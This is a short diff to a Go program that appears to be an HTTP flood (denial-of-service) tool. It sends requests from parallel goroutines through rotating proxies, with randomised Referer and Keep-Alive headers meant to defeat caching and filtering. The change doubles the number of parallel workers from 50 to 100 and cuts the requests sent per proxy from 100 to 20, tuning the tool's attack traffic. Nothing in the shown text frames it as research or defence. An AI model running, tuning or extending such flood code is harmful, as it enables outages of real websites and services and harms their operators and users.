@@ -90,7 +90,7 @@ func main() {
     req.Header.Set("Keep-Alive", string(rand.Intn(10)+100))
     req.Header.Set("Connection", "keep-alive")
 
-    for i := 0; i < 50; i++ {
+    for i := 0; i < 100; i++ {
         go func() { // Using a goroutine to run each worker in parallel
             for referer := range refererChannel {
                 transport := &http.Transport{
@@ -106,7 +106,7 @@ func main() {
                 req.Header.Set("Referer", referer+buildblock(rand.Intn(5)+5))
 
                 // Make 100 requests using one proxy and referer
-                for j := 0; j < 100; j++ {
+                for j := 0; j < 20; j++ {
                     resp, err := client.Do(req)
                     if err != nil {
                         continue
